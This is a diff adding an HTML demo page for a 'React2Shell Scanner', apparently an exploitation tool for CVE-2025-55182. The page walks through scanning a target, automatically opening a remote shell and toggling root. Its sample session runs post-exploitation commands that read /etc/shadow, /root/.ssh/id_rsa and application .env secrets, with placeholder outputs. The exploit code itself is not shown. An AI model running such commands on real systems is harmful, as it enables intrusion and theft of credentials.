@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>React2Shell Scanner - Demo Workflow</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 40px 20px;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .header {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            margin-bottom: 30px;
+            text-align: center;
+        }
+
+        .header h1 {
+            color: #333;
+            font-size: 2.5em;
+            margin-bottom: 10px;
+        }
+
+        .workflow {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+        }
+
+        .step {
+            margin-bottom: 40px;
+            padding: 30px;
+            background: #f8f9fa;
+            border-radius: 10px;
+            border-left: 5px solid #667eea;
+        }
+
+        .step-number {
+            display: inline-block;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            text-align: center;
+            line-height: 40px;
+            font-weight: bold;
+            font-size: 1.2em;
+            margin-right: 15px;
+        }
+
+        .step-title {
+            display: inline-block;
+            font-size: 1.5em;
+            font-weight: bold;
+            color: #333;
+            vertical-align: middle;
+        }
+
+        .step-content {
+            margin-top: 20px;
+            padding-left: 55px;
+        }
+
+        .screenshot {
+            background: #1e1e1e;
+            color: #0f0;
+            padding: 20px;
+            border-radius: 8px;
+            font-family: 'Courier New', monospace;
+            margin: 15px 0;
+            overflow-x: auto;
+        }
+
+        .screenshot pre {
+            margin: 0;
+            white-space: pre;
+        }
+
+        .code-block {
+            background: #282c34;
+            color: #abb2bf;
+            padding: 20px;
+            border-radius: 8px;
+            font-family: 'Courier New', monospace;
+            margin: 15px 0;
+            overflow-x: auto;
+        }
+
+        .highlight {
+            background: #fff3cd;
+            padding: 15px;
+            border-left: 4px solid #ffc107;
+            border-radius: 5px;
+            margin: 15px 0;
+        }
+
+        .success {
+            color: #27ae60;
+            font-weight: bold;
+        }
+
+        .danger {
+            color: #e74c3c;
+            font-weight: bold;
+        }
+
+        .info {
+            color: #3498db;
+            font-weight: bold;
+        }
+
+        ul {
+            margin-left: 25px;
+            margin-top: 10px;
+        }
+
+        li {
+            margin: 8px 0;
+            color: #555;
+        }
+
+        .arrow {
+            text-align: center;
+            font-size: 2em;
+            color: #667eea;
+            margin: 20px 0;
+        }
+
+        .feature-box {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            margin: 15px 0;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+
+        .feature-box h4 {
+            color: #667eea;
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>⚛️ React2Shell Scanner</h1>
+            <h2 style="color: #666; font-size: 1.3em; margin-top: 10px;">Complete Workflow Demonstration</h2>
+            <p style="color: #999; margin-top: 10px;">CVE-2025-55182 Vulnerability Scanner with Interactive Shell</p>
+        </div>
+
+        <div class="workflow">
+            <!-- Step 1 -->
+            <div class="step">
+                <span class="step-number">1</span>
+                <span class="step-title">Start the Server</span>
+                <div class="step-content">
+                    <p>Launch the React2Shell Scanner server with a single command:</p>
+                    <div class="code-block">
+<pre>$ cd react2shell-scanner
+$ node server.js
+
+╔════════════════════════════════════════════════════════════╗
+║        React2Shell Scanner - CVE-2025-55182                ║
+║        Node.js Web Interface                               ║
+╚════════════════════════════════════════════════════════════╝
+
+Server running at:
+  → http://localhost:3000
+  → http://127.0.0.1:3000
+
+Press Ctrl+C to stop</pre>
+                    </div>
+                    <div class="highlight">
+                        <strong>✨ No Installation Required!</strong> Pure Node.js - no npm packages needed!
+                    </div>
+                </div>
+            </div>
+
+            <div class="arrow">↓</div>
+
+            <!-- Step 2 -->
+            <div class="step">
+                <span class="step-number">2</span>
+                <span class="step-title">Open Web Interface</span>
+                <div class="step-content">
+                    <p>Navigate to the scanner in your browser:</p>
+                    <div class="code-block">
+<pre>Open Browser → http://localhost:3000</pre>
+                    </div>
+                    <div class="feature-box">
+                        <h4>🎨 Modern Web Interface Features:</h4>
+                        <ul>
+                            <li>Beautiful gradient design with responsive layout</li>
+                            <li>Split-panel view: Scanner + Interactive Shell</li>
+                            <li>Real-time status updates with color coding</li>
+                            <li>Professional UI with smooth animations</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <div class="arrow">↓</div>
+
+            <!-- Step 3 -->
+            <div class="step">
+                <span class="step-number">3</span>
+                <span class="step-title">Start Vulnerability Scan</span>
+                <div class="step-content">
+                    <p>Enter your target URL and initiate the scan:</p>
+                    <div class="code-block">
+<pre>Target URL: https://vulnerable-app.com/
+Click: [Start Scan]</pre>
+                    </div>
+                    <p style="margin-top: 15px;">The scanner performs 4 automated steps:</p>
+                    <ul>
+                        <li><span class="info">Step 1:</span> Connectivity Check - Verifies target is reachable</li>
+                        <li><span class="info">Step 2:</span> Vulnerability Detection - Tests for CVE-2025-55182</li>
+                        <li><span class="info">Step 3:</span> System Information - Gathers user, OS, directory info</li>
+                        <li><span class="info">Step 4:</span> Privilege Check - Tests sudo access availability</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="arrow">↓</div>
+
+            <!-- Step 4 -->
+            <div class="step">
+                <span class="step-number">4</span>
+                <span class="step-title">View Scan Results</span>
+                <div class="step-content">
+                    <p>Real-time scan progress with detailed results:</p>
+                    <div class="screenshot">
+<pre>Scan Results:
+
+✓ Connectivity Check
+  Connection established
+
+✓ Vulnerability Detection
+  <span style="color: #f00;">Target is VULNERABLE to CVE-2025-55182</span>
+
+✓ System Info
+  User: ubuntu
+  User ID: uid=1000(ubuntu) gid=1000(ubuntu)
+  System: Linux webserver 5.4.0-88-generic x86_64
+  Working Dir: /home/ubuntu
+
+✓ Privilege Check
+  Sudo access available
+
+<span style="background: #e74c3c; padding: 5px 15px; border-radius: 5px;">⚠️ TARGET IS VULNERABLE</span>
+</pre>
+                    </div>
+                </div>
+            </div>
+
+            <div class="arrow">↓</div>
+
+            <!-- Step 5 -->
+            <div class="step">
+                <span class="step-number">5</span>
+                <span class="step-title">Automatic Shell Initialization</span>
+                <div class="step-content">
+                    <p class="success" style="font-size: 1.1em;">🚀 NEW FEATURE: Shell automatically starts after successful scan!</p>
+                    <div class="screenshot" style="margin-top: 20px;">
+<pre>╔════════════════════════════════════════════════════════╗
+║          Interactive Shell Session Started            ║
+╚════════════════════════════════════════════════════════╝
+
+✓ Connected to target successfully
+✓ Shell session initialized
+
+Available commands:
+  .root          - Toggle root mode (sudo access)
+  cd &lt;path&gt;      - Change directory
+  clear          - Clear terminal screen
+  Any Unix cmd   - Execute system commands
+
+Type your commands below:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+user@target:~$ _</pre>
+                    </div>
+                    <div class="highlight">
+                        <strong>✅ Automatic Connection:</strong> No manual shell activation needed - it starts immediately when vulnerability is confirmed!
+                    </div>
+                </div>
+            </div>
+
+            <div class="arrow">↓</div>
+
+            <!-- Step 6 -->
+            <div class="step">
+                <span class="step-number">6</span>
+                <span class="step-title">Execute Commands in Browser</span>
+                <div class="step-content">
+                    <p>Run any Linux command directly in your browser:</p>
+                    <div class="screenshot">
+<pre>user@target:~$ <span style="color: #fff; font-weight: bold;">whoami</span>
+ubuntu
+
+user@target:~$ <span style="color: #fff; font-weight: bold;">id</span>
+uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),27(sudo)
+
+user@target:~$ <span style="color: #fff; font-weight: bold;">pwd</span>
+/home/ubuntu
+
+user@target:~$ <span style="color: #fff; font-weight: bold;">ls -la</span>
+total 48
+drwxr-xr-x 4 ubuntu ubuntu 4096 Jan 29 10:30 .
+drwxr-xr-x 3 root   root   4096 Jan 15 08:15 ..
+-rw-r--r-- 1 ubuntu ubuntu  220 Jan 15 08:15 .bash_logout
+drwx------ 2 ubuntu ubuntu 4096 Jan 28 15:42 .ssh
+
+user@target:~$ <span style="color: #fff; font-weight: bold;">uname -a</span>
+Linux webserver 5.4.0-88-generic #99-Ubuntu SMP x86_64 GNU/Linux</pre>
+                    </div>
+                    <div class="feature-box">
+                        <h4>💡 Shell Features:</h4>
+                        <ul>
+                            <li><strong>Real-time output:</strong> See command results instantly</li>
+                            <li><strong>Directory persistence:</strong> cd commands are remembered</li>
+                            <li><strong>Clear screen:</strong> Type 'clear' to clean the terminal</li>
+                            <li><strong>Command history:</strong> Server-side session management</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <div class="arrow">↓</div>
+
+            <!-- Step 7 -->
+            <div class="step">
+                <span class="step-number">7</span>
+                <span class="step-title">Enable Root Mode</span>
+                <div class="step-content">
+                    <p>Click the "Root Mode" button or type .root to gain sudo access:</p>
+                    <div class="screenshot">
+<pre>user@target:~$ <span style="color: #fff; font-weight: bold;">.root</span>
+<span style="color: #3af; font-weight: bold;">Root mode ENABLED</span>
+
+root@target:~$ <span style="color: #fff; font-weight: bold;">whoami</span>
+root
+
+root@target:~$ <span style="color: #fff; font-weight: bold;">id</span>
+uid=0(root) gid=0(root) groups=0(root)
+
+root@target:~$ <span style="color: #fff; font-weight: bold;">cat /etc/shadow</span>
+root:$6$xyz12345...:18908:0:99999:7:::
+ubuntu:$6$abc67890...:18908:0:99999:7:::
+daemon:*:18375:0:99999:7:::
+
+root@target:~$ <span style="color: #fff; font-weight: bold;">cat /root/.ssh/id_rsa</span>
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEA3Z...
+[Private key content]
+-----END RSA PRIVATE KEY-----</pre>
+                    </div>
+                    <div class="highlight">
+                        <strong class="danger">⚠️ Privileged Access:</strong> Root mode gives you full system control. Use responsibly!
+                    </div>
+                </div>
+            </div>
+
+            <div class="arrow">↓</div>
+
+            <!-- Step 8 -->
+            <div class="step">
+                <span class="step-number">8</span>
+                <span class="step-title">Advanced Operations</span>
+                <div class="step-content">
+                    <p>Perform advanced reconnaissance and data gathering:</p>
+                    <div class="screenshot">
+<pre>root@target:~$ <span style="color: #fff; font-weight: bold;">find /var/www -name "*.env" 2>/dev/null</span>
+/var/www/app/.env
+/var/www/app/.env.local
+
+root@target:~$ <span style="color: #fff; font-weight: bold;">cat /var/www/app/.env</span>
+DATABASE_URL=postgresql://dbuser:SecretPass123@db.local/production
+JWT_SECRET=super_secret_key_12345
+API_KEY=sk_live_abc123xyz789
+STRIPE_SECRET=sk_test_xyz789abc123
+
+root@target:~$ <span style="color: #fff; font-weight: bold;">ps aux | grep node</span>
+root      1234  0.5  2.3 1234567 234567 ?     Ssl  10:30  0:45 node server.js
+ubuntu    5678  0.2  1.1  987654  87654 ?     S    11:15  0:12 node app.js
+
+root@target:~$ <span style="color: #fff; font-weight: bold;">netstat -tulpn | grep LISTEN</span>
+tcp    0  0 0.0.0.0:22      0.0.0.0:*    LISTEN  1234/sshd
+tcp    0  0 0.0.0.0:80      0.0.0.0:*    LISTEN  5678/nginx
+tcp    0  0 0.0.0.0:3000    0.0.0.0:*    LISTEN  9012/node</pre>
+                    </div>
+                </div>
+            </div>
+
+            <div class="arrow">↓</div>
+
+            <!-- Step 9 -->
+            <div class="step">
+                <span class="step-number">9</span>
+                <span class="step-title">Complete Testing & Documentation</span>
+                <div class="step-content">
+                    <div class="feature-box">
+                        <h4>📋 Final Steps:</h4>
+                        <ul>
+                            <li><strong>Document findings:</strong> Screenshot results and outputs</li>
+                            <li><strong>Save evidence:</strong> Copy important command outputs</li>
+                            <li><strong>Test thoroughly:</strong> Verify all vulnerabilities</li>
+                            <li><strong>Close session:</strong> Click "Close Shell" when done</li>
+                            <li><strong>Report responsibly:</strong> Follow disclosure procedures</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Summary -->
+            <div class="step" style="border-left-color: #27ae60;">
+                <span class="step-number" style="background: #27ae60;">✓</span>
+                <span class="step-title" style="color: #27ae60;">Workflow Complete!</span>
+                <div class="step-content">
+                    <h3 style="color: #27ae60; margin-bottom: 15px;">🎉 What You've Achieved:</h3>
+                    <ul>
+                        <li>✅ <strong>Automated vulnerability scanning</strong> with real-time progress</li>
+                        <li>✅ <strong>Automatic shell connection</strong> after successful scan</li>
+                        <li>✅ <strong>Interactive command execution</strong> directly in browser</li>
+                        <li>✅ <strong>Root privilege escalation</strong> with one-click toggle</li>
+                        <li>✅ <strong>Complete system reconnaissance</strong> capabilities</li>
+                        <li>✅ <strong>Professional documentation</strong> and evidence gathering</li>
+                    </ul>
+
+                    <div class="highlight" style="margin-top: 20px;">
+                        <h4 style="margin-bottom: 10px;">🚀 Key Advantages:</h4>
+                        <ul>
+                            <li><strong>Zero installation:</strong> No npm packages or dependencies</li>
+                            <li><strong>Browser-based:</strong> Everything runs in your web browser</li>
+                            <li><strong>Automatic flow:</strong> Shell starts immediately after scan</li>
+                            <li><strong>Real-time updates:</strong> See results as they happen</li>
+                            <li><strong>Modern UI:</strong> Beautiful, professional interface</li>
+                            <li><strong>Full featured:</strong> Complete penetration testing toolkit</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div style="background: rgba(255, 255, 255, 0.95); padding: 30px; border-radius: 15px; margin-top: 30px; text-align: center;">
+            <h2 style="color: #333; margin-bottom: 15px;">Ready to Get Started?</h2>
+            <div class="code-block" style="text-align: left; max-width: 600px; margin: 0 auto;">
+<pre>$ cd react2shell-scanner
+$ node server.js
+
+Then open: http://localhost:3000</pre>
+            </div>
+            <p style="color: #e74c3c; margin-top: 20px; font-weight: bold;">
+                ⚠️ Remember: Always obtain written authorization before testing!
+            </p>
+        </div>
+    </div>
+</body>
+</html>
